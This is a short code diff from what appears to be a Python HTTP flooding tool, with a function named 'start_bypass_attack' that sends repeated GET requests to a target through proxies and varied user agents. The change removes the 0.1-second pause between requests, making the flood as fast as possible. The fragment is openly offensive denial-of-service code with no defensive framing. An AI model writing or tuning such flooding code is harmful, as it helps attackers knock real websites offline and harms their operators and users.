@@ -15,6 +15,6 @@ def start_bypass_attack(target, proxies, user_agents, duration):
             status = bot.get_request(target)
             print(f"✅ GET request to {target} | Status: {status}")
             total_requests += 1
-            time.sleep(0.1)
+            time.sleep(0)
 
     print(f"🎉 Attack finished! Total requests sent: {total_requests}")
